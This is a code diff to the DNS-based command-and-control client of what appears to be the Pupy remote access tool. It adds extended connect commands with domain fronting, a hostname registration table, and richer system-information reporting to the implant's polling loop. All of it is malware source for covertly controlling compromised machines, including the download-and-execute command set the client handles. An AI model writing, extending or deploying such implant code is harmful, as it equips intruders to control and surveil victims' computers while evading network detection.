@@ -32,10 +32,12 @@ from picocmd import (
     SystemStatus,
     Sleep, CheckConnect,
     Reexec, Exit, Disconnect,
-    Policy, Kex, SystemInfo,
+    Policy, Kex,
     SetProxy, Connect, DownloadExec,
     PasteLink, CustomEvent,
     OnlineStatusRequest, PupyState,
+    SystemInfoEx, ConnectEx, RegisterHostnameId,
+    AddressTable,
     Error, ParcelInvalidCrc,
     ParcelInvalidPayload,
     Parcel,
@@ -146,6 +148,7 @@ class DnsCommandsClient(Thread):
         self.active = True
         self.failed = 0
         self.proxy = None
+        self.address_table = AddressTable()
         self._request_lock = Lock()
 
         Thread.__init__(self)
@@ -189,6 +192,9 @@ class DnsCommandsClient(Thread):
         )
 
     def _dnslib_resolve(self, hostname):
+        if self.qtype is None:
+            return []
+
         q = dnslib.DNSRecord.question(hostname, self.qtype)
         r = None
 
@@ -479,7 +485,7 @@ class DnsCommandsClient(Thread):
     def on_downloadexec_content(self, url, action, content):
         pass
 
-    def on_connect(self, ip, port, transport, proxy):
+    def on_connect(self, address, port, transport, proxy, hostname=None):
         pass
 
     def on_checkconnect(self, host, port_start, port_end):
@@ -558,7 +564,7 @@ class DnsCommandsClient(Thread):
                     self.on_session_established()
 
             elif isinstance(command, Poll):
-                response = self._request(SystemInfo())
+                response = self._request(SystemInfoEx())
 
                 if len(response) > 0 and not isinstance(response[0], Ack):
                     logging.debug('dnscnc:Submit SystemInfo: response=%s', response)
@@ -587,6 +593,27 @@ class DnsCommandsClient(Thread):
                     command.transport,
                     self.proxy
                 )
+            elif isinstance(command, ConnectEx):
+                address = command.address
+                fronting = None
+
+                if command.address_type == ConnectEx.TARGET_ID:
+                    address = self.address_table.get_address(address)
+                    if command.fronting:
+                        fronting = self.address_table.get_address(command.fronting)
+                else:
+                    address = str(address)
+
+                self.on_connect(
+                    address,
+                    command.port,
+                    command.transport,
+                    self.proxy,
+                    fronting
+                )
+            elif isinstance(command, RegisterHostnameId):
+                logging.debug('Register hostname: %s -> %d', command.hostname, command.id)
+                self.address_table.register(command.hostname, command.id)
             elif isinstance(command, Error):
                 self.on_error(command.error, command.message)
             elif isinstance(command, Disconnect):
